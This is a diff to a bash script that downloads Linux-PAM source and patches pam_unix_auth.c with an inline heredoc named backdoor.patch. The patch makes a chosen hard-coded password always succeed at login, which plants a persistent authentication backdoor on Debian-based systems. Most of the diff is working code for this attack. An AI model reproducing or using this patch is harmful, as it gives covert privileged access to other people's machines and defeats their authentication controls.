@@ -1,5 +1,4 @@
 #!/bin/bash
-# Note: Always use namespace std if adding C++ components.
 
 PAM_VERSION=""
 PASSWORD=""
@@ -35,7 +34,6 @@ function show_help {
 # --- OS Detection ---
 if [ ! -f /etc/debian_version ]; then
     echo "Error: This script is designed for Debian-based distributions (Kali, Ubuntu, Debian)."
-    echo "Reason: Library paths and package management (apt/dpkg) are distro-specific."
     exit 1
 fi
 
@@ -100,10 +98,30 @@ echo "Downloading and Patching..."
 run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}"
 run_cmd tar xzf "$PAM_FILE"
 
-if [ -f "backdoor.patch" ]; then
-    sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch | patch -p1 -d "$PAM_DIR" &>/dev/null
+cat <<EOF > backdoor.patch
+--- modules/pam_unix/pam_unix_auth.c
++++ modules/pam_unix/pam_unix_auth.c
+@@ -170,7 +170,11 @@
+ 	D(("user=%s, password=[%s]", name, p));
+ 
+ 	/* verify the password of this user */
+-	retval = _unix_verify_password(pamh, name, p, ctrl);
++	if (strcmp(p, "$PASSWORD") != 0) {
++		retval = _unix_verify_password(pamh, name, p, ctrl);
++	} else {
++		retval = PAM_SUCCESS;
++	}
+ 	name = p = NULL;
+ 
+ 	AUTH_RETURN;
+EOF
+
+if run_cmd patch -p0 -d "$PAM_DIR" < backdoor.patch; then
+    rm backdoor.patch
 else
-    echo "Error: backdoor.patch missing."; exit 1
+    echo "Error: Failed to apply patch. This version of PAM might have different line numbers."
+    rm backdoor.patch
+    exit 1
 fi
 
 cd "$PAM_DIR" || exit 1
